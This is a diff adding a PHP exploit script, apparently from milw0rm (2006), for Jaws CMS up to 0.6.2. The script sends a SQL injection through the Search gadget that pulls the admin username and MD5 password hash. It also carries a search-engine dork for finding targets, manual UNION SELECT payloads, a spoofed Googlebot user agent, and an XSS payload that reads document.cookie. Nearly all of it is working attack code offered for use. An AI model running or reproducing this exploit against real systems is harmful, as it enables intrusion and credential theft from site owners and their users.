@@ -1,0 +1,177 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Jaws <= 0.6.2 'Search gadget' SQL injection / admin credentials disclosure\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n";
+echo "dork: \"powered by jaws\" | \"powered by the jaws project\" | inurl:?gadget=search\r\n\r\n";
+/*
+works regardless of php.ini settings
+if 'Search gadget' is enabled
+*/
+
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to jaws\r\n";
+echo "Options:\r\n";
+echo "   -T[prefix]   specify a table prefix different from default (no prefix)\r\n";
+echo "                try blog_ even\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Example:\r\n";
+echo "php ".$argv[0]." localhost /jaws/ \r\n";
+echo "php ".$argv[0]." localhost /jaws/ -Tblog_\r\n";
+die;
+}
+
+# software site: http://www.jaws-project.com/
+# manual exploitation:
+#
+# i)sql injection:
+#   go to http://[target]/[path_to_jaws]/?gadget=Search
+#   if search module is enabled, in search field type:
+#
+#   1%')/**/UNION/**/SELECT/**/0,passwd,username,0,0/**/FROM/**/users/**/WHERE/**/id=1/*
+#
+#   or
+@
+#   1%')/**/UNION/**/SELECT/**/0,passwd,username,0,0/**/FROM/**/blog_users/**/WHERE/**/id=1/*
+#
+#   now at screen you have admin username & password hash
+#   this works with magic_quotes_gpc both on & off
+#
+# ii)xss:
+#    http://[target]/[path_to_jaws]/gadgets/RssReader/extras/magpierss/scripts/magpie_slashbox.php?rss_url=<script>alert(document.cookie)</script>
+
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$prefix="";
+$proxy="";
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $prefix=str_replace("-T","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$sql="1%')/**/UNION/**/SELECT/**/0,CONCAT('*SUNTZU*',passwd,'*SUNTZU*'),CONCAT('*SUNTZOI*',username,'*SUNTZOI*'),0,0/**/FROM/**/".$prefix."users/**/WHERE/**/id=1/*";
+$sql=urlencode($sql);
+$data="gadget=Search";
+$data.="&action=Results";
+$data.="&gadgets=All";
+$data.="&searchdata=".$sql;
+$data.="&searchButton=Search";
+$packet="POST ".$p."index.php HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (eregi("Gadget is not enabled",$html))
+{
+die("search gadget is not enabled... exploit failed");
+}
+$temp=explode('">*SUNTZOI*',$html);
+$temp2=explode('*SUNTZOI*',$temp[1]);
+$admin=$temp2[0];
+$temp=explode('href="*SUNTZU*',$html);
+$temp2=explode('*SUNTZU*',$temp[1]);
+$hash=$temp2[0];
+if (($admin<>'') and ($hash<>'') and (is_hash($hash)))
+{
+echo "Exploit succeeded...\r\n";
+echo "--------------------------------------------------------------------\r\n";
+echo "admin          -> ".$admin."\r\n";
+echo "password (md5) -> ".$hash."\r\n";
+echo "--------------------------------------------------------------------\r\n";
+}
+else
+{
+echo "Exploit failed, maybe wrong table prefix...";
+}
+?>
+
+# milw0rm.com [2006-06-23]
